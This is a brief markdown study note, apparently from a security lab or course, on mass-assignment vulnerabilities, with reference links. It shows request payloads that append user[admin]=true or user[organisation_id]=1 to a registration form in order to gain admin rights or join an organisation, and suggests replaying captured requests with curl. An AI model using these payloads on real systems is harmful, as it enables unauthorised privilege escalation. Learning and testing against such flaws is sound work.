# **Mass-assignment vulnerability:**
  
- **(You can use a proxy or the web application debugger to inspect the traffic and copy the request as a curl command to send them back to the server.)**
  
- user[username]=test&user[password]=password&submit=Submit Query&**user[admin]=true**
  - ```using the bit user[admin]=true or user[admin]=1``` ***is where we elevate our permissions to admin***
- user[username]=test&user[password]=password&submit=Submit Query&**user[organisation_id]=1**
  - ```using the bit user[organisation_id]=1``` ***this registers a user to organisation 1***

&nbsp;

- Resources on Mass Assignment Vulnerability:
  - [OWASP CHEATSHEET on Mass Assignment Vulnerability](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
  - [Mass Assignment](https://ropesec.com/articles/mass-assignment/)
  - [Exploring Rails Mass Assignment Vulnerability](https://medium.com/@jaeger.rob/exploring-rails-mass-assignment-vulnerability-b8b3d19e20b6)
  - [API Mass Assignment Vulnerability](https://www.virtuesecurity.com/kb/api-mass-assignment/)
  - [Mass Assignment Vulnerability](https://pragtob.wordpress.com/tag/mass-assignment-vulnerability/)
  - [A Git Horror Story on Mass Assignment Vulnerability](https://mikegerwitz.com/2012/05/a-git-horror-story-repository-integrity-with-signed-commits)